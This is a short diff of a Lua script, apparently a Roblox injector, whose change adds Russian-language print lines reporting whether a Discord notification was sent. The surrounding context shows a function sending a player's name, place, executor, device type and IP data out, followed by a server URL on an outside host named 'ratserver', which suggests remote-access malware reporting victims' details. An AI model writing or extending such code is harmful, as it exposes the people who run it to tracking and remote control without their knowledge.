@@ -271,6 +271,12 @@ local function sendInjectNotification()
     
     local success = sendDirectNotification(playerName, placeName, executor, deviceType, ipData)
     
+    if success then
+        print("Уведомление отправлено в Discord")
+    else
+        print("Ошибка отправки в Discord")
+    end
+    
     local SERVER_URL = "https://ratserver-6wo3.onrender.com"
     
     if requestFunc then
